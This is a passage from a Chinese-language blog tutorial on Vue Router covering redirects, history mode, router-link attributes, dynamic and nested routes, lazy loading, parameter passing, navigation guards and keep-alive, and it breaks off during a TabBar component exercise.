data-lazy-src="https://unpkg.com/nan-picture/blog/20201111112112.png"></p><blockquote><p><code>&lt;router-link&gt;</code>：该标签是一个vue-router中已经内置的组件, 它会被渲染成一个<code>&lt;a&gt;</code>标签。<br><code>&lt;router-view&gt;</code>：该标签会根据当前的路径, 动态渲染出不同的组件。<br>网页的其他内容，比如顶部的标题&#x2F;导航，或者底部的一些版权信息等会和<code>&lt;router-view&gt;</code>处于同一个等级，<br>在路由切换时，切换的是<code>&lt;router-view&gt;</code>挂载的组件，其他内容不会发生改变。</p></blockquote><h2 id="（六）最终效果"><a href="#（六）最终效果" class="headerlink" title="（六）最终效果"></a>（六）最终效果</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111113241.png"></p><h1 id="细节处理"><a href="#细节处理" class="headerlink" title="细节处理"></a>细节处理</h1><h2 id="路由的默认路径"><a href="#路由的默认路径" class="headerlink" title="路由的默认路径"></a>路由的默认路径</h2><p>默认情况下进入网站的首页，我们希望<code>&lt;router-view&gt;</code>渲染首页的内容。</p><p>但是我们的实现中，默认没有显示首页组件，必须让用户点击首页才可以。</p><p>如何可以让路径默认跳到到首页, 并且<code>&lt;router-view&gt;</code>渲染首页组件呢？</p><p>我们只需要配置多一个默认映射就可以了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>: <span class="string">&#x27;/home&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>配置解析：我们在routes中又配置了一个映射. </p><ul><li>path配置的是根路径（&#x2F;）或者可以为空</li><li>redirect是重定向，也就是我们将根路径重定向到&#x2F;home的路径下，这样就可以得到我们想要的结果了。</li></ul><h2 id="更改router的模式为history模式"><a href="#更改router的模式为history模式" class="headerlink" title="更改router的模式为history模式"></a>更改router的模式为history模式</h2><p>我们前面说过改变路径的方式有两种：URL的hash和HTML5的history。</p><p>默认情况下，router路径的改变使用的是URL的hash。</p><p>如果希望使用HTML5的history模式， 进行如下配置即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;history&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>可以看到url地址中没有了#</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111114735.png"></p><h2 id="router-link的补充"><a href="#router-link的补充" class="headerlink" title="router-link的补充"></a>router-link的补充</h2><p>在前面的<code>&lt;router-link&gt;</code>中，我们只是使用了一个属性：to，用于指定跳转的路径。</p><p><code>&lt;router-link&gt;</code>还有一些其他属性：</p><ul><li>tag：可以指定<code>&lt;router-link&gt;</code>之后渲染成什么组件，<code>&lt;router-link to=&#39;/home&#39; tag=&#39;button&#39;&gt;</code>会被渲染成一个按钮，而不是<code>&lt;a&gt;</code>标签。</li><li>replace：不会留下history记录，所以指定replace的情况下，点击后退键返回并不能返回到上一个页面中。</li><li>active-class：当<code>&lt;router-link&gt;</code>对应的路由匹配成功时，会自动给当前元素设置一个<strong>router-link-active</strong>的class，而我们可以通过设置 active-class 来修改默认的class属性。<ul><li>在进行高亮显示的导航菜单或者底部tabbar时会使用到该类。但是通常不会修改类的属性，会直接使用默认的<strong>router-link-active</strong>即可。</li><li><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111121425.png"></li></ul></li></ul><p><code>&lt;router-link to=&quot;/home&quot; tag=&quot;button&quot; replace active-class=&quot;active&quot;&gt;首页&lt;/router-link&gt;</code></p><h2 id="修改linkActiveClass"><a href="#修改linkActiveClass" class="headerlink" title="修改linkActiveClass"></a>修改linkActiveClass</h2><p>该class具体的属性也可以通过router实例的属性进行修改 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;history&#x27;</span>,</span><br><span class="line">  <span class="attr">linkActiveClass</span>: <span class="string">&#x27;active&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111121500.png"></p><h2 id="路由代码跳转"><a href="#路由代码跳转" class="headerlink" title="路由代码跳转"></a>路由代码跳转</h2><p>有时候页面的跳转可能需要执行对应的JavaScript代码，这个时候就可以使用第二种跳转方式了。</p><p>在src&#x2F;App.vue中配置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;linkToHome&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;linkToAbout&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">linkToHome</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// this.$router.push(&#x27;home&#x27;)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">replace</span>(<span class="string">&#x27;home&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">linkToAbout</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// this.$router.push(&#x27;about&#x27;)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">replace</span>(<span class="string">&#x27;about&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h1><p>在某些情况下，一个页面的path路径是不确定的，比如我们进入用户界面时，希望是如下的路径：&#x2F;user&#x2F;james或&#x2F;user&#x2F;kobe，除了有前面的&#x2F;user之外，后面还跟上了用户的ID。</p><p>这种path和Component的匹配关系，我们称之为动态路由(也是路由传递数据的一种方式)。</p><p><code>&lt;router-link :to=&quot;&#39;/user/&#39;+ userId&quot;&gt;用户&lt;/router-link&gt;</code></p><p><code>&lt;router-link: to=&quot;&#123;name: &#39;User&#39;,params: &#123;userId: userId&#125;&#125;&quot;&gt;</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  ...</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/user/:userId&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;User&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">User</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是用户：&#123;&#123;$route.params.userId&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="路由懒加载"><a href="#路由懒加载" class="headerlink" title="路由懒加载"></a>路由懒加载</h1><h2 id="认识路由的懒加载"><a href="#认识路由的懒加载" class="headerlink" title="认识路由的懒加载"></a>认识路由的懒加载</h2><ul><li>官方给出了解释:<ul><li>当打包构建应用时，Javascript包会变得非常大，影响页面加载。</li><li>如果我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应组件，这样就更加高效了。</li></ul></li><li>官方在说什么呢?<ul><li>首先，我们知道路由中通常会定义很多不同的组件。</li><li>这些组件最后都被打包放在一个js文件中。</li><li>但是这么多组件放在一个js文件中，必然会造成这个文件非常的大，影响加载。</li><li>如果我们一次性从服务器请求下来这个文件，可能需要花费一定的时间，甚至用户的电脑上还可能会出现短暂空白的情况。</li><li>如何避免这种情况呢? 使用路由懒加载就可以了.</li></ul></li><li>路由懒加载做了什么?<ul><li>路由懒加载的主要作用就是将每个路由对应的组件打包成一个个的js代码块。</li><li>只有在这个路由被访问到的时候，才加载对应的组件。</li></ul></li></ul><h2 id="路由懒加载的效果"><a href="#路由懒加载的效果" class="headerlink" title="路由懒加载的效果"></a>路由懒加载的效果</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111125039.png"></p><h2 id="懒加载的方式"><a href="#懒加载的方式" class="headerlink" title="懒加载的方式"></a>懒加载的方式</h2><p>方式一：结合Vue的异步组件和Webpack的代码分析</p><p>const Home &#x3D; resolve &#x3D;&gt; { require.ensure([‘..&#x2F;components&#x2F;Home.vue’], () &#x3D;&gt; {resolve(require(‘..&#x2F;components&#x2F;Home.vue’)) })};</p><p>方式二：AMD写法</p><p>const About &#x3D; resolve &#x3D;&gt; require([‘..&#x2F;components&#x2F;About.vue’], resolve);</p><p>方式三：在ES6中，我们可以有更加简单的写法来组织Vue异步组件和Webpack的代码分割</p><p>const Home &#x3D; () &#x3D;&gt; import(‘..&#x2F;components&#x2F;Home.vue’)</p><h1 id="路由嵌套"><a href="#路由嵌套" class="headerlink" title="路由嵌套"></a>路由嵌套</h1><h2 id="认识嵌套路由"><a href="#认识嵌套路由" class="headerlink" title="认识嵌套路由"></a>认识嵌套路由</h2><p>嵌套路由是一个很常见的功能，比如在home页面中,，我们希望通过&#x2F;home&#x2F;news和&#x2F;home&#x2F;message访问一些内容。<br>路径和组件的关系如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111125526.png"></p><h2 id="嵌套路由实现"><a href="#嵌套路由实现" class="headerlink" title="嵌套路由实现"></a>嵌套路由实现</h2><p>实现嵌套路由有两个步骤：</p><ol><li>创建对应的子组件, 并且在路由映射中配置对应的子路由（嵌套路由也可以配置默认的路径）。</li><li>在组件内部使用<code>&lt;router-view&gt;</code>标签。</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111125920.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111141215.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111141436.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111142015.png"></p><h1 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h1><p>传递参数主要有两种类型：params和query</p><ul><li>params的类型：<br>配置路由格式：&#x2F;router&#x2F;:id<br>传递的方式：在path后面跟上对应的值<br>传递后形成的路径：&#x2F;router&#x2F;123，&#x2F;router&#x2F;abc</li><li>query的类型:<br>配置路由格式：&#x2F;router，也就是普通配置<br>传递的方式：<strong>对象</strong>中使用query的key作为传递方式<br>传递后形成的路径：&#x2F;router?id&#x3D;123，&#x2F;router?id&#x3D;abc</li><li>有两种方式使用： <code>&lt;router-link&gt;</code>的方式和JavaScript代码方式（路由代码跳转）</li></ul><p><code>下图12行才是params的传递方式</code></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201111152139.png"></p><hr><p>获取参数通过**$route**对象获取的。</p><p>在使用了 vue-router 的应用中，路由对象会被注入每个组件中，赋值为 this.$route ，并且当路由切换时，路由对象会被更新。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123; $route.query &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>$route和$router是有区别的：</strong></p><ul><li>$router为VueRouter实例，想要导航到不同URL，则使用$router.push等方法。</li><li>$route为当前router跳转对应的对象，可以获取name、path、query、params等</li></ul><h1 id="导航守卫"><a href="#导航守卫" class="headerlink" title="导航守卫"></a>导航守卫</h1><p>我们来考虑一个需求：在一个SPA应用中，如何改变网页的标题呢？</p><p>网页标题是通过<code>&lt;title&gt;</code>来显示的，但是SPA只有一个固定的HTML，切换不同的页面时，标题并不会改变。</p><p>但是我们可以通过JavaScript来修改<code>&lt;title&gt;</code>的内容：window.document.title &#x3D; ‘新的标题’</p><p>那么在Vue项目中，我们比较容易想到的修改标题的位置是每一个路由对应的组件.vue文件中，通过mounted声明周期函数，执行对应的代码进行修改即可。但是当页面比较多时, 这种方式不容易维护(因为需要在多个页面执行类似的代码)。</p><p>有没有更好的办法呢? 使用导航守卫即可.</p><p>什么是导航守卫?</p><ul><li><p>vue-router提供的导航守卫主要用来监听路由的进入和离开</p></li><li><p>vue-router提供了beforeEach和afterEach的钩子函数，它们会在路由即将改变前和改变后触发</p></li></ul><hr><p>我们可以利用beforeEach来完成标题的修改：</p><ul><li>首先，我们可以在route当中定义一些标题，可以利用meta来定义：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  ...</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">About</span>,</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;关于&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>其次，利用导航守卫，修改我们的标题：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">title</span> = to.<span class="property">matched</span>[<span class="number">0</span>].<span class="property">meta</span>.<span class="property">title</span></span><br><span class="line">  <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>导航钩子的三个参数解析：<br>to：即将要进入的目标的路由对象<br>from：当前导航即将要离开的路由对象<br>next：调用该方法后, 才能进入下一个钩子</p><hr><p>补充一：如果是后置钩子，也就是afterEach，不需要主动调用next()函数。<br>补充二：上面我们使用的导航守卫，被称之为全局导航守卫。</p><p>更多内容，可以查看<a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html#%E8%B7%AF%E7%94%B1%E7%8B%AC%E4%BA%AB%E7%9A%84%E5%AE%88%E5%8D%AB">官网</a>进行学习。</p><h1 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h1><p>keep-alive 是 <strong>Vue 内置</strong>的一个组件，可以使被包含的组件保留状态，或避免重新渲染。</p><p>它们有两个非常重要的属性：</p><ul><li>include - 字符串或正则表达，只有匹配的组件会被缓存（组件名就是export中的name）</li><li>exclude - 字符串或正则表达式，任何匹配的组件都不会被缓存</li></ul><p>router-view 是 <strong>Vue Router</strong> 的一个组件，如果直接被包在 keep-alive 里面，所有路径匹配到的视图组件都会被缓存，不会被销毁，可通过 create 函数或 destroyed 函数验证：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keep-alive</span> <span class="attr">includ</span>=<span class="string">&quot;Home&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>在我们上面的案例实现中，当我们访问完消息组件后，再去访问用户组件时，可以通过首页组件的destroyed函数发现首页组件被销毁，再次回到首页组件时，并没有显示我们上次浏览的消息组件，解决途径如下：</p><ol><li>我们可以在App.vue中配置keep-alive，使我们首页的组件被缓存而不是销毁。</li><li>注释掉原本我们在index.js中配置的首页<strong>子组件中</strong>的默认路由。</li><li>在首页组件data中创建path数据，通过activated函数，使每次首页组件<strong>活跃时</strong>跳转到对应的路由。</li><li>当首页组件<strong>准备跳转</strong>到其他路由时，通过<strong>组件内的守卫</strong>beforeRouteLeave将当前路由保存到path中。</li><li>这样当我们从其他组件返回首页组件时，可以通过activated函数返回到我们上次浏览保存的路由。</li></ol><p><code>注意：activated函数和deactivated函数只有在组件被keep-alive标签包裹时才生效，同时第一次创建并访问组件时，activated函数也会执行。keep-alive只缓存父组件，如果要使子组件不被销毁，则在父组件中使用keep-alive。</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是首页页面<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/home/news&quot;</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/home/messages&quot;</span>&gt;</span>消息<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">name</span>: <span class="string">&quot;Home&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">path</span>: <span class="string">&#x27;/home/news&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">created</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;home create&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">destroyed</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;home destroy&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">activated</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">path</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">beforeRouteLeave</span>(<span class="params">to, <span class="keyword">from</span>, next</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">this</span>.<span class="property">path</span> = <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">path</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">next</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="TabBar练习"><a href="#TabBar练习" class="headerlink" title="TabBar练习"></a>TabBar练习</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201112143446.png"></p><p>如果有一个单独的TabBar组件，你如何封装？</p><ul><li><p>自定义TabBar组件，在APP中使用</p></li><li><p>让TabBar位于底部，并且设置相关的样式</p></li><li><p>TabBar中显示的内容由外界决定，定义插槽</p></li><li><p>flex布局平分TabBar</p></li></ul><p>TabBar组件里通过子组件TabBarItem，可以传入图片和文字：</p><ul><li>自定义TabBarItem组件，并且定义两个插槽：图片、文字</li><li>给两个插槽外层包装div，用于设置样式</li><li>填充插槽，实现底部TabBar的效果</li><li>由于要传入高亮图片，定义另外一个插槽，插入active-icon的数据</li><li>定义一个变量isActive，通过v-show来决定是否显示对应的icon</li></ul><p>TabBarItem绑定路由数据：</p><ul><li>安装路由：npm install vue-router —save</li><li>完成router&#x2F;index.js的内容，以及创建对应的组件</li><li>main.js中注册router</li><li>APP中加入<code>&lt;router-view&gt;</code>组件</li></ul><p>点击item跳转到对应路由，并且动态决定isActive：</p><ul><li>监听item的点击，通过this.$router.replace()替换路由路径</li><li>通过this.$route.path.indexOf(this.link) !&#x3D;&#x3D; -1来判断是否是active</li></ul><p>动态计算active样式：</p><ul><li>封装新的计算属性：this.isActive ? {‘color’: ‘red’} : {}</li></ul><hr><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>TabBarItem组件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;tab-bar-item&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;itemClick&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;!isActive&quot;</span> <span class="attr">class</span>=<span 